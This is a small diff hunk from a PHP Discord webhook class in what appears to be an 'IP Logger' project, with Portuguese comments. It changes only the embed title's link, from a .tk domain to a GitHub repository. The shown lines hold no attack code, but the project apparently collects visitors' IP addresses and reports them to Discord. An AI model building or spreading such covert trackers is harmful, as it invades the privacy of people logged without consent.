@@ -47,7 +47,7 @@ class Discord
             "embeds" => [array(
 
                 "title" => "IP Logger", //Titulo da embed
-                "url" => "https://666fuckthecops.tk/", //Link do titulo da embed (opcional)
+                "url" => "https://github.com/zyrox68/IP-Logger", //Link do titulo da embed (opcional)
                 "color" => "39423", //Cor do Webhook (Usar codigo hexadecimal)
 
                 "fields" => [array(
